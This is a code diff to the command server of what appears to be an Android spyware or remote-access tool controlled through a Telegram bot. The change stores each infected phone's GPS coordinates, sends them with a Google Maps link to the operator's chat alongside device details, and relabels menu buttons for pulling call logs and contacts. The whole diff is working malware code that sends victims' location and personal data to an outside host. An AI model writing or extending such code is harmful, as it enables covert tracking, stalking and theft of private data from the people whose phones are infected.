@@ -16,7 +16,7 @@ const appServer = http.createServer(app);
 const appSocket = new webSocket.Server({server: appServer});
 const appBot = new telegramBot(token, {polling: true});
 const appClients = new Map()
-
+const deviceLocations = new Map(); // model -> {lat, lon}
 const upload = multer();
 app.use(bodyParser.json());
 
@@ -45,9 +45,16 @@ app.post("/uploadText", (req, res) => {
     res.send('')
 })
 app.post("/uploadLocation", (req, res) => {
-    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
-    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, {parse_mode: "HTML"})
-    res.send('')
+    const model = req.headers.model;
+    const lat = req.body['lat'];
+    const lon = req.body['lon'];
+
+    if (lat && lon && model) {
+        deviceLocations.set(model, { lat, lon });
+        appBot.sendLocation(id, lat, lon);
+        appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, { parse_mode: "HTML" });
+    }
+    res.send('');
 })
 appSocket.on('connection', (ws, req) => {
     const uuid = uuid4.v4()
@@ -65,14 +72,22 @@ appSocket.on('connection', (ws, req) => {
         brightness: brightness,
         provider: provider
     })
+
+const lokasi = deviceLocations.get(model);
+    let lokasiText = '';
+    if (lokasi) {
+        lokasiText = `• ʟᴏᴄᴀᴛɪᴏɴ : <b><a href="https://maps.google.com/?q=${lokasi.lat},${lokasi.lon}">Open Maps</a></b>\n`;
+    }
+
     appBot.sendMessage(id,
         `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
         `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
         `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
         `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
         `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
-        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
-        {parse_mode: "HTML"}
+        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>\n` +
+        lokasiText,
+        {parse_mode: "HTML", disable_web_page_preview: true}
     )
     ws.on('close', function () {
         appBot.sendMessage(id,
@@ -403,7 +418,7 @@ appBot.on("callback_query", (callbackQuery) => {
                         {text: '𝙏𝙤𝙖𝙨𝙩', callback_data: `toast:${uuid}`}
                     ],
                     [
-                        {text: '𝙋𝙖𝙣𝙜𝙜𝙞𝙡𝙖𝙣', callback_data: `calls:${uuid}`},
+                        {text: ' Log 𝙋𝙖𝙣𝙜𝙜𝙞𝙡𝙖𝙣', callback_data: `calls:${uuid}`},
                         {text: '𝘽𝙪𝙠𝙪 𝙠𝙤𝙣𝙩𝙖𝙠', callback_data: `contacts:${uuid}`}
                     ],
                     [
